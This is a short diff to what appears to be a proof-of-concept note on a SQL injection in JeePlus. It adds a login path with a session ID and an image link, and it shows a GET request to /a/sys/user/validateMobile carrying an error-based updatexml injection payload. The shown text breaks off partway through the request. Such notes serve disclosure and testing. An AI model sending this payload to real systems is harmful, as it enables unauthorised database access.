@@ -4,7 +4,8 @@
 ```
 app="JeePlus"
 ```
-
+/a/login;JSESSIONID=ef8c3f5587fd4e9abbac730443364d1e
+![image](https://github.com/user-attachments/assets/7f812b3b-2772-470e-ada6-107673bf8d65)
 ## poc
 ```
 GET /a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271 HTTP/1.1
